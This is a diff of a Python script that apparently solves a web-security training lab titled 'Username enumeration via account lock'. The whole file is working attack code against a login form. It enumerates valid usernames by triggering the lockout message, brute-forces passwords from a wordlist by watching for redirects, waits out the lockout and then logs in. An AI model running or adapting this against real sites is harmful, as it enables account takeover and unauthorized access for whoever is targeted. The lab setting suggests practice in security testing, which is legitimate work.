@@ -18,7 +18,7 @@ def send_login(host, username, password, allow_redirects=False):
         1 if response is a 302 redirect
         2 if response contains the string 'Invalid username or password.'
         3 if response contains the string 'You have made too many incorrect login attempts.'
-        9 if response contains the string 'Congratulations, you solved the lab!'
+        9 if response contains the string f'Your username is: {username}'
     """
     url = f'{host}/login'
 
@@ -34,45 +34,59 @@ def send_login(host, username, password, allow_redirects=False):
     if 'You have made too many incorrect login attempts' in res:
         return 3
 
-    if 'Congratulations, you solved the lab!' in res:
+    if f'Your username is: {username}' in res:
         return 9
 
     return False
 
 
 def enumerate_username(host):
-    print(f'[ ] Attempt username: ', end='\r')
     with open('../candidate_usernames.txt') as f:
         for line in f:
             username = line.strip()
-            msg = f'[ ] Try username: {username}'
-            print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg))}', end='\r', flush=True)
+            msg = f'[ ] Brute force username: {username}'
+            print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\r', flush=True)
+
             for i in range(1, 5):
                 if send_login(host, username, f'xxx') == 3:
+                    msg = f'[+] Username found: {username}'
+                    print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)
                     return username
+
+    msg = f'[-] Failed to brute force username'
+    print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)
     return False
 
 
 def brute_force_password(host, username):
-    print(f'[ ] Attempt password: ', end='\r')
     with open('../candidate_passwords.txt') as f:
         for line in f:
             password = line.strip()
-            msg = f'[ ] Try password: {password}'
-            print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg))}', end='\r', flush=True)
+            msg = f'[ ] Brute force password: {password}'
+            print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\r', flush=True)
+
             res = send_login(host, username, password)
             if res == 1 or res is False:
+                msg = f'[+] Password found: {password}'
+                print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)
                 return password
+
+    msg = f'[-] Failed to brute force password'
+    print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)
     return False
 
 
 def wait():
-    s = 65
-    print(f'[ ] Waiting {s} seconds to expire lockout')
-    time.sleep(s)
+    for i in range(65, 0, -1):
+        msg = f'[ ] Waiting {i} seconds to expire lockout'
+        print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\r', flush=True)
+        time.sleep(1)
+    msg = f'[+] Account lockout should be expired'
+    print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)
 
 
 def main():
+    print('[+] Lab: Username enumeration via account lock')
     try:
         host = sys.argv[1].strip().rstrip('/')
     except IndexError:
@@ -80,19 +94,14 @@ def main():
         print(f'Exampe: {sys.argv[0]} http://www.example.com')
         sys.exit(-1)
 
-    print(f'[ ] Brute force username and password')
     username = enumerate_username(host)
     if not username:
-        print(f'[-] Failed to enumerate username')
         sys.exit(-2)
-    print(f'[+] Found username: {username}')
     # wait() # Waiting here not really required as it is not relevant for the password brute-force
 
     password = brute_force_password(host, username)
     if not password:
-        print(f'[-] Failed to brute force password')
         sys.exit(-3)
-    print(f'[+] Found password: {password}')
     wait()
 
     if send_login(host, username, password, allow_redirects=True) == 9:
